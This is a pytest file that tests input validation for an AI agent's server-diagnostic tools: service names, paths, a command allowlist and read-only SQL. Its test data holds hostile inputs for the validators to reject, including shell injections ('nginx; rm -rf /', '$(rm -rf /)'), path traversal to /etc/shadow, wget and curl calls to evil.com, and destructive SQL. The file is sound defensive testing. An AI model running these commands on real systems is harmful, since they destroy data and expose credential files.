"""Tests for tools.py — validation, security, and tool definitions."""

from __future__ import annotations

import pytest

from supavision.executor import CommandResult, Executor
from supavision.tools import (
    TOOL_DEFINITIONS,
    ToolDispatcher,
    _is_diagnostic_allowed,
    _is_readonly_sql,
    _validate_path,
    _validate_service_name,
)

# ── Service name validation ──────────────────────────────────────


class TestServiceNameValidation:
    """_validate_service_name must accept safe names and reject injections."""

    def test_valid_simple_name(self):
        assert _validate_service_name("nginx") is None

    def test_valid_name_with_dot(self):
        assert _validate_service_name("pm2.service") is None

    def test_valid_name_with_hyphen(self):
        assert _validate_service_name("my-service") is None

    def test_valid_name_with_underscore(self):
        assert _validate_service_name("my_service") is None

    def test_valid_name_with_digits(self):
        assert _validate_service_name("pm2-ubuntu") is None

    def test_rejects_semicolon_injection(self):
        err = _validate_service_name("nginx; rm -rf /")
        assert err is not None
        assert "Invalid service name" in err

    def test_rejects_pipe_injection(self):
        err = _validate_service_name("nginx | cat /etc/passwd")
        assert err is not None

    def test_rejects_backtick_injection(self):
        err = _validate_service_name("nginx`whoami`")
        assert err is not None

    def test_rejects_ampersand_injection(self):
        err = _validate_service_name("nginx && rm -rf /")
        assert err is not None

    def test_rejects_dollar_injection(self):
        err = _validate_service_name("$(rm -rf /)")
        assert err is not None

    def test_rejects_empty_string(self):
        err = _validate_service_name("")
        assert err is not None

    def test_rejects_too_long_name(self):
        err = _validate_service_name("a" * 129)
        assert err is not None
        assert "too long" in err

    def test_accepts_max_length_name(self):
        assert _validate_service_name("a" * 128) is None


# ── Path validation ──────────────────────────────────────────────


class TestPathValidation:
    """_validate_path must accept absolute paths and reject traversal."""

    def test_valid_absolute_path(self):
        assert _validate_path("/etc/nginx/nginx.conf") is None

    def test_valid_var_log(self):
        assert _validate_path("/var/log/syslog") is None

    def test_valid_path_with_spaces(self):
        assert _validate_path("/var/log/my file.log") is None

    def test_valid_etc_shadow(self):
        # The tool reads arbitrary files — no restriction on what file,
        # just that the path is absolute and well-formed. /etc/shadow is valid.
        assert _validate_path("/etc/shadow") is None

    def test_rejects_relative_path(self):
        err = _validate_path("etc/nginx/nginx.conf")
        assert err is not None
        assert "absolute" in err

    def test_rejects_path_traversal_double_dot(self):
        err = _validate_path("/var/log/../../etc/shadow")
        assert err is not None
        assert "traversal" in err.lower() or ".." in err

    def test_rejects_leading_double_dot(self):
        err = _validate_path("../../etc/shadow")
        assert err is not None

    def test_rejects_empty_path(self):
        err = _validate_path("")
        assert err is not None
        assert "empty" in err.lower()

    def test_rejects_path_with_special_chars(self):
        # _SAFE_PATH only allows alphanumeric, dots, slashes, spaces, underscores, hyphens
        err = _validate_path("/etc/nginx;rm -rf /")
        assert err is not None

    def test_rejects_backtick_in_path(self):
        err = _validate_path("/etc/`whoami`")
        assert err is not None

    def test_rejects_dollar_in_path(self):
        err = _validate_path("/etc/$(cat /etc/passwd)")
        assert err is not None

    def test_rejects_too_long_path(self):
        err = _validate_path("/" + "a" * 512)
        assert err is not None
        assert "too long" in err.lower()

    def test_accepts_max_length_path(self):
        # 512 chars total including the leading /
        path = "/" + "a" * 511
        assert _validate_path(path) is None


# ── Diagnostic command allowlist ─────────────────────────────────


class TestDiagnosticAllowlist:
    """_is_diagnostic_allowed: exact matches and prefix matches."""

    def test_exact_match_docker_ps(self):
        assert _is_diagnostic_allowed("docker ps") is True

    def test_exact_match_docker_ps_a(self):
        assert _is_diagnostic_allowed("docker ps -a") is True

    def test_exact_match_nginx_test(self):
        assert _is_diagnostic_allowed("nginx -t") is True

    def test_exact_match_pm2_list(self):
        assert _is_diagnostic_allowed("pm2 list") is True

    def test_exact_match_uname(self):
        assert _is_diagnostic_allowed("uname -a") is True

    def test_exact_match_whoami(self):
        assert _is_diagnostic_allowed("whoami") is True

    def test_prefix_curl_localhost(self):
        assert _is_diagnostic_allowed("curl -s localhost:3000/health") is True

    def test_prefix_curl_http_localhost(self):
        assert _is_diagnostic_allowed("curl -s http://localhost:8080/api") is True

    def test_prefix_docker_logs(self):
        assert _is_diagnostic_allowed("docker logs --tail 50 mycontainer") is True

    def test_prefix_docker_inspect(self):
        assert _is_diagnostic_allowed("docker inspect mycontainer") is True

    def test_prefix_git_log(self):
        assert _is_diagnostic_allowed("git log --oneline -20") is True

    def test_prefix_head(self):
        assert _is_diagnostic_allowed("head -n 100 /var/log/syslog") is True

    def test_prefix_tail(self):
        assert _is_diagnostic_allowed("tail -n 100 /var/log/syslog") is True

    def test_prefix_ls(self):
        assert _is_diagnostic_allowed("ls /var/www") is True

    def test_prefix_find(self):
        assert _is_diagnostic_allowed("find /var/www -name '*.py'") is True

    def test_rejects_arbitrary_command(self):
        assert _is_diagnostic_allowed("rm -rf /") is False

    def test_rejects_curl_to_external(self):
        # curl without the exact prefix "curl -s localhost:" etc
        assert _is_diagnostic_allowed("curl https://evil.com") is False

    def test_rejects_python(self):
        assert _is_diagnostic_allowed("python3 -c 'import os; os.system(\"rm -rf /\")'") is False

    def test_rejects_bash(self):
        assert _is_diagnostic_allowed("bash -c 'rm -rf /'") is False

    def test_rejects_wget_to_external(self):
        assert _is_diagnostic_allowed("wget https://evil.com/malware") is False

    def test_rejects_empty_command(self):
        assert _is_diagnostic_allowed("") is False

    def test_strips_whitespace(self):
        assert _is_diagnostic_allowed("  docker ps  ") is True

    def test_rejects_chained_command(self):
        assert _is_diagnostic_allowed("docker ps && rm -rf /") is False


# ── SQL read-only validation ─────────────────────────────────────


class TestSQLReadOnly:
    """_is_readonly_sql: allow SELECT, block writes."""

    def test_select_allowed(self):
        assert _is_readonly_sql("SELECT * FROM users") is True

    def test_select_with_where(self):
        assert _is_readonly_sql("SELECT id, name FROM users WHERE active = 1") is True

    def test_show_tables_allowed(self):
        assert _is_readonly_sql("SHOW TABLES") is True

    def test_describe_allowed(self):
        assert _is_readonly_sql("DESCRIBE users") is True

    def test_explain_allowed(self):
        assert _is_readonly_sql("EXPLAIN SELECT * FROM users") is True

    def test_drop_table_rejected(self):
        assert _is_readonly_sql("DROP TABLE users") is False

    def test_drop_in_select_rejected(self):
        # If someone tries to sneak DROP into a comment-stripped query
        assert _is_readonly_sql("SELECT 1; DROP TABLE users") is False

    def test_insert_rejected(self):
        assert _is_readonly_sql("INSERT INTO users (name) VALUES ('test')") is False

    def test_update_rejected(self):
        assert _is_readonly_sql("UPDATE users SET name = 'hacked'") is False

    def test_delete_rejected(self):
        assert _is_readonly_sql("DELETE FROM users WHERE 1=1") is False

    def test_alter_rejected(self):
        assert _is_readonly_sql("ALTER TABLE users ADD COLUMN admin BOOL") is False

    def test_truncate_rejected(self):
        assert _is_readonly_sql("TRUNCATE TABLE users") is False

    def test_create_rejected(self):
        assert _is_readonly_sql("CREATE TABLE evil (id INT)") is False

    def test_grant_rejected(self):
        assert _is_readonly_sql("GRANT ALL ON *.* TO 'hacker'@'%'") is False

    def test_revoke_rejected(self):
        assert _is_readonly_sql("REVOKE ALL ON *.* FROM 'user'@'%'") is False

    def test_sql_comment_stripping(self):
        # Write keyword hidden in a comment should still be safe
        assert _is_readonly_sql("SELECT * FROM users -- DROP TABLE users") is True

    def test_block_comment_stripping(self):
        assert _is_readonly_sql("SELECT * FROM users /* DROP TABLE */") is True

    def test_drop_outside_comment_detected(self):
        # Comment then real DROP
        assert _is_readonly_sql("-- just a comment\nDROP TABLE users") is False

    def test_case_insensitive_detection(self):
        assert _is_readonly_sql("drop table users") is False
        assert _is_readonly_sql("Drop Table Users") is False

    def test_merge_rejected(self):
        assert _is_readonly_sql("MERGE INTO users USING ...") is False

    def test_replace_rejected(self):
        assert _is_readonly_sql("REPLACE INTO users VALUES (1, 'x')") is False


# ── Tool definitions structure ───────────────────────────────────


class TestToolDefinitions:
    """Verify TOOL_DEFINITIONS has required fields for the Anthropic API."""

    def test_definitions_is_nonempty_list(self):
        assert isinstance(TOOL_DEFINITIONS, list)
        assert len(TOOL_DEFINITIONS) == 7

    def test_every_tool_has_name(self):
        for tool in TOOL_DEFINITIONS:
            assert "name" in tool
            assert isinstance(tool["name"], str)
            assert len(tool["name"]) > 0

    def test_every_tool_has_description(self):
        for tool in TOOL_DEFINITIONS:
            assert "description" in tool
            assert isinstance(tool["description"], str)
            assert len(tool["description"]) > 0

    def test_every_tool_has_input_schema(self):
        for tool in TOOL_DEFINITIONS:
            assert "input_schema" in tool
            schema = tool["input_schema"]
            assert schema["type"] == "object"
            assert "properties" in schema
            assert "required" in schema

    def test_expected_tool_names(self):
        names = {t["name"] for t in TOOL_DEFINITIONS}
        expected = {
            "get_system_metrics",
            "check_service_status",
            "read_file",
            "list_directory",
            "check_logs",
            "run_diagnostic",
            "query_database",
        }
        assert names == expected

    def test_service_name_required_for_check_service(self):
        tool = next(t for t in TOOL_DEFINITIONS if t["name"] == "check_service_status")
        assert "service_name" in tool["input_schema"]["required"]

    def test_path_required_for_read_file(self):
        tool = next(t for t in TOOL_DEFINITIONS if t["name"] == "read_file")
        assert "path" in tool["input_schema"]["required"]

    def test_command_required_for_run_diagnostic(self):
        tool = next(t for t in TOOL_DEFINITIONS if t["name"] == "run_diagnostic")
        assert "command" in tool["input_schema"]["required"]

    def test_query_required_for_query_database(self):
        tool = next(t for t in TOOL_DEFINITIONS if t["name"] == "query_database")
        assert "query" in tool["input_schema"]["required"]


# ── ToolDispatcher integration tests ─────────────────────────────


class TestToolDispatcher:
    """Test ToolDispatcher with a mock executor."""

    @pytest.fixture
    def mock_executor(self):
        """Create an executor that returns canned results instead of running commands."""

        class FakeExecutor(Executor):
            def __init__(self):
                super().__init__()
                self.last_command = None

            async def run(self, command: str, timeout: int | None = None) -> CommandResult:
                self.last_command = command
                return CommandResult(stdout="ok", stderr="", exit_code=0)

        return FakeExecutor()

    @pytest.fixture
    def dispatcher(self, mock_executor):
        return ToolDispatcher(executor=mock_executor)

    @pytest.mark.asyncio
    async def test_unknown_tool_returns_error(self, dispatcher):
        result = await dispatcher.dispatch("nonexistent_tool", {})
        assert "Unknown tool" in result

    @pytest.mark.asyncio
    async def test_call_count_increments(self, dispatcher):
        assert dispatcher.call_count == 0
        await dispatcher.dispatch("get_system_metrics", {})
        assert dispatcher.call_count == 1
        await dispatcher.dispatch("get_system_metrics", {})
        assert dispatcher.call_count == 2

    @pytest.mark.asyncio
    async def test_get_system_metrics_runs(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch("get_system_metrics", {})
        assert "ok" in result
        assert mock_executor.last_command is not None

    @pytest.mark.asyncio
    async def test_check_service_valid_name(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch("check_service_status", {"service_name": "nginx"})
        assert "ok" in result
        assert "nginx" in mock_executor.last_command

    @pytest.mark.asyncio
    async def test_check_service_injection_blocked(self, dispatcher):
        result = await dispatcher.dispatch(
            "check_service_status", {"service_name": "nginx; rm -rf /"}
        )
        assert "VALIDATION ERROR" in result

    @pytest.mark.asyncio
    async def test_read_file_valid_path(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch("read_file", {"path": "/var/log/syslog"})
        assert "ok" in result
        assert "/var/log/syslog" in mock_executor.last_command

    @pytest.mark.asyncio
    async def test_read_file_traversal_blocked(self, dispatcher):
        result = await dispatcher.dispatch("read_file", {"path": "/var/log/../../etc/shadow"})
        assert "VALIDATION ERROR" in result

    @pytest.mark.asyncio
    async def test_read_file_relative_blocked(self, dispatcher):
        result = await dispatcher.dispatch("read_file", {"path": "etc/passwd"})
        assert "VALIDATION ERROR" in result

    @pytest.mark.asyncio
    async def test_read_file_max_lines_clamped(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch(
            "read_file", {"path": "/var/log/syslog", "max_lines": 5000}
        )
        assert "ok" in result
        # The command should clamp to 1000
        assert "head -n 1000" in mock_executor.last_command

    @pytest.mark.asyncio
    async def test_list_directory_valid_path(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch("list_directory", {"path": "/var/www"})
        assert "ok" in result
        assert "/var/www" in mock_executor.last_command

    @pytest.mark.asyncio
    async def test_list_directory_traversal_blocked(self, dispatcher):
        result = await dispatcher.dispatch("list_directory", {"path": "/var/../etc"})
        assert "VALIDATION ERROR" in result

    @pytest.mark.asyncio
    async def test_check_logs_valid_service(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch("check_logs", {"service": "nginx", "lines": 100})
        assert "ok" in result
        assert "nginx" in mock_executor.last_command
        assert "-n 100" in mock_executor.last_command

    @pytest.mark.asyncio
    async def test_check_logs_injection_blocked(self, dispatcher):
        result = await dispatcher.dispatch("check_logs", {"service": "nginx; cat /etc/passwd"})
        assert "VALIDATION ERROR" in result

    @pytest.mark.asyncio
    async def test_check_logs_lines_clamped(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch("check_logs", {"service": "nginx", "lines": 999})
        assert "ok" in result
        assert "-n 500" in mock_executor.last_command

    @pytest.mark.asyncio
    async def test_run_diagnostic_allowed_command(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch("run_diagnostic", {"command": "docker ps"})
        assert "ok" in result
        assert mock_executor.last_command == "docker ps"

    @pytest.mark.asyncio
    async def test_run_diagnostic_rejected_command(self, dispatcher):
        result = await dispatcher.dispatch("run_diagnostic", {"command": "rm -rf /"})
        assert "REJECTED" in result

    @pytest.mark.asyncio
    async def test_run_diagnostic_empty_command(self, dispatcher):
        result = await dispatcher.dispatch("run_diagnostic", {"command": ""})
        assert "ERROR" in result

    @pytest.mark.asyncio
    async def test_query_database_readonly_allowed(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch(
            "query_database",
            {"query": "SELECT * FROM users", "db_type": "postgresql"},
        )
        assert "ok" in result

    @pytest.mark.asyncio
    async def test_query_database_write_rejected(self, dispatcher):
        result = await dispatcher.dispatch(
            "query_database",
            {"query": "DROP TABLE users", "db_type": "mysql"},
        )
        assert "REJECTED" in result

    @pytest.mark.asyncio
    async def test_query_database_insert_rejected(self, dispatcher):
        result = await dispatcher.dispatch(
            "query_database",
            {"query": "INSERT INTO users VALUES (1, 'x')", "db_type": "mysql"},
        )
        assert "REJECTED" in result

    @pytest.mark.asyncio
    async def test_query_database_empty_query(self, dispatcher):
        result = await dispatcher.dispatch(
            "query_database",
            {"query": "", "db_type": "mysql"},
        )
        assert "ERROR" in result

    @pytest.mark.asyncio
    async def test_query_database_unknown_db_type(self, dispatcher):
        result = await dispatcher.dispatch(
            "query_database",
            {"query": "SELECT 1", "db_type": "mongodb"},
        )
        assert "Unsupported" in result or "ERROR" in result

    @pytest.mark.asyncio
    async def test_query_database_mysql_with_connection_string(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch(
            "query_database",
            {
                "query": "SELECT 1",
                "db_type": "mysql",
                "connection_string": "user:pass@localhost/testdb",
            },
        )
        assert "ok" in result
        assert "mysql" in mock_executor.last_command

    @pytest.mark.asyncio
    async def test_query_database_postgresql_with_connection_string(self, dispatcher, mock_executor):
        result = await dispatcher.dispatch(
            "query_database",
            {
                "query": "SELECT 1",
                "db_type": "postgresql",
                "connection_string": "postgresql://user:pass@localhost/testdb",
            },
        )
        assert "ok" in result
        assert "psql" in mock_executor.last_command

    @pytest.mark.asyncio
    async def test_format_result_timed_out(self, dispatcher):
        result = dispatcher._format_result(
            CommandResult(stdout="partial", stderr="", exit_code=-1, timed_out=True)
        )
        assert "timed out" in result.lower()

    @pytest.mark.asyncio
    async def test_format_result_exit_code(self, dispatcher):
        result = dispatcher._format_result(
            CommandResult(stdout="", stderr="error occurred", exit_code=1)
        )
        assert "Exit code: 1" in result
        assert "error occurred" in result

    @pytest.mark.asyncio
    async def test_format_result_empty(self, dispatcher):
        result = dispatcher._format_result(
            CommandResult(stdout="", stderr="", exit_code=0)
        )
        assert result == "[No output]"
